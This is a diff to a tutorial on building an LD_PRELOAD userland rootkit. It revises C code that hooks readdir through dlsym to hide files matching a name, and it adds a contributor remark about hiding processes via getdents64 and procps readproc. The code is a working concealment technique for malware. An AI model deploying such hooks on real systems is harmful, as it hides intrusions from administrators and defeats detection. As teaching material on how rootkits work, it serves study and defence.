@@ -35,6 +35,7 @@ struct dirent {
 The `readdir` function returns `NULL` on error or if the directory list is done, but we can simply call the next entry. For that, however, we'll need to call the original `readdir` function, which can be easily done with `dlopen` and `dlsym`:
 
 ```c
+#define _GNU_SOURCE
 #include <dlfcn.h>
 #include <dirent.h>
 #include <string.h>
@@ -45,34 +46,27 @@ typedef struct dirent* (*readdir_pfn_t)(DIR*);
 
 static readdir_pfn_t g_original_readdir = NULL;
 
-struct dirent* readdir(DIR* dirp)
+struct
+dirent*
+readdir(DIR* dirp)
 {
     struct dirent* ret = NULL;
 
     // Validate original function exists
-    if (NULL == g_original_readdir)
-    {
+    if (g_original_readdir == NULL) {
         g_original_readdir = dlsym(RTLD_NEXT, "readdir");
-        if (NULL == g_original_readdir)
-	{
-            goto cleanup;
-        }
+        if (g_original_readdir == NULL)
+	    return ret;
     }
 
     // Invoke and skip directory entries to hide
-    do
-    {
-        ret = g_original_readdir(dirp);
-	      if (NULL == ret)
-	      {
-            goto cleanup;
-	      }
+    while ((ret = g_original_readdir(dirp)) != NULL) {
+         if (strstr(ret->d_name, FILENAME_TO_HIDE))
+	    continue;
+	return ret;
     }
-    while (NULL != strstr(ret->d_name, FILENAME_TO_HIDE));
 
-cleanup:
-
-    // Return the entry
+    // readdir returns NULL when no entries left
     return ret;
 }
 ```
@@ -142,7 +136,7 @@ clean:
 ## Hiding processes
 Let's also remove the `FILENAME_TO_HIDE` from process listing (e.g. in tools like `ps`).  
 Process listing can easily be done by reading the `/proc` filesystem; however, most tools (`ps` included) do not read `procfs` on their own, they instead use a library, and the most well-known library to do that is called [procps](https://gitlab.com/procps-ng/procps).  
-Well, `procps` has a function called `readproc` for process listing - it returns a `proc_t*` which has many, many fields - one of them is `cmdline` which contains the command-line.
+Well, `procps` has a function called `readproc` for process listing - it returns a `proc_t*` which has many, many fields - one of them is `cmdline` which contains the command-line. (You can also achieve hiding processes by hooking getents64 - Humza)
 
 So, we can do something very similar, let's export our `readproc` function and skip entries with `FILENAME_TO_HIDE` in their command-line:
 ```c
